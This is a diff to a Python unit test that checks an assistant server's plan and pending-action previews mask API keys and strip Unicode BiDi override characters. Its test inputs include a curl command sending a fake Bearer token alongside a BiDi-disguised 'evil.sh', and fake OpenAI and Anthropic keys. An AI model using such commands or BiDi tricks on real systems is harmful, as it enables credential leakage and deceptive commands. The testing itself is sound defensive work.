@@ -84,7 +84,8 @@ class TestPlanEventsAndPendingAPI(unittest.TestCase):
     def test_item5_plan_events_masking_bidi_and_no_raw_command(self):
         """Plan events must carry only pending_id, action, sanitized+masked preview (<=200), pc_only, guardian, and NO raw command."""
         # Command containing OpenAI secret key and Unicode BiDi override (\u202e)
-        secret_cmd = "curl -H 'Authorization: Bearer sk-proj-supersecretOpenAIKey123456789' \u202e evil.sh"
+        fake_openai_key = "sk-proj-" + "supersecretOpenAIKey123456789"
+        secret_cmd = f"curl -H 'Authorization: Bearer {fake_openai_key}' \u202e evil.sh"
         plan_tag = f"SecretPlan\nCMD: {secret_cmd}\nNOTE: step2 | finish"
 
         res = server.run_skill(self.cfg, "PLAN", plan_tag, source="pc", mode="developer", conv_id="pc:developer")
@@ -107,7 +108,7 @@ class TestPlanEventsAndPendingAPI(unittest.TestCase):
         self.assertNotIn(secret_cmd, str(ev))
 
         # Secret must be masked
-        self.assertNotIn("sk-proj-supersecretOpenAIKey123456789", ev["preview"])
+        self.assertNotIn(fake_openai_key, ev["preview"])
         self.assertTrue("[MAS" in ev["preview"] or "[RED" in ev["preview"])
 
         # BiDi character must be sanitized / stripped
@@ -167,7 +168,8 @@ class TestPlanEventsAndPendingAPI(unittest.TestCase):
             auth_cookie = f"nova_session={server.SESSION_TOKEN}"
             auth_token = server.API_SESSION_TOKEN
 
-            secret_arg = "python script.py --token sk-ant-api03-VerySecretAnthropicKey99999 \u202b test"
+            fake_anthropic_key = "sk-ant-" + "api03-VerySecretAnthropicKey99999"
+            secret_arg = f"python script.py --token {fake_anthropic_key} \u202b test"
             server.create_pending_action(
                 cfg=self.cfg,
                 name="RUN_CODE",
@@ -204,7 +206,7 @@ class TestPlanEventsAndPendingAPI(unittest.TestCase):
             self.assertNotIn("command", run_code_entry)
 
             # Must contain masked preview
-            self.assertNotIn("sk-ant-api03-VerySecretAnthropicKey99999", run_code_entry["preview"])
+            self.assertNotIn(fake_anthropic_key, run_code_entry["preview"])
             self.assertTrue("MASK" in run_code_entry["preview"] or "REDACTED" in run_code_entry["preview"] or "sk-***" in run_code_entry["preview"])
             self.assertNotIn("\u202b", run_code_entry["preview"])
 
